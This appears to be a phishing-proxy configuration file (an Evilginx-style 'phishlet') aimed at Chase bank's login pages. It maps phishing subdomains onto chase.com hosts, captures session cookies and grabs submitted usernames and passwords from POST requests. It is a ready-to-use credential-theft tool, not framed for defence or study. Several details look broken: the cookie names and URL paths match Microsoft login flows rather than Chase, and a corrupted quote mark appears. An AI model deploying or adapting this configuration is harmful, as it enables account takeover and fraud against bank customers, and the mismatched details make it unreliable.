author: '@YoungMoney01'

min_ver: '2.3.0'

proxy_hosts:

  - {phish_sub: '', orig_sub: 'www', domain: 'chase.com', session: true, is_landing: true}

  - {phish_sub: 'login', orig_sub: 'secure07c', domain: 'chase.com', session: true, is_landing: false}

  - {phish_sub: 'account', orig_sub: 'secure05c', domain: 'chase.com', session: false, is_landing: false}

sub_filters:

  - {triggers_on: 'secure05c.chase.com', orig_sub: 'www', domain: 'chase.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}

  - {triggers_on: 'secure07c.chase.com', orig_sub: 'www', domain: 'chase.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:

  - domain: '.chase.com'

    keys: ['WLSSC','RPSSecAuth']

credentials:

  username:

    key: 'login'

    search: '(.*)'

    type: 'post'

  password:

    key: â€˜password'

    search: '(.*)'

    type: 'post'

login:

  domain: 'secure07c.chase.com'

  path: '/web/auth/dashboard#/dashboard/overviewAccounts/overview/index'
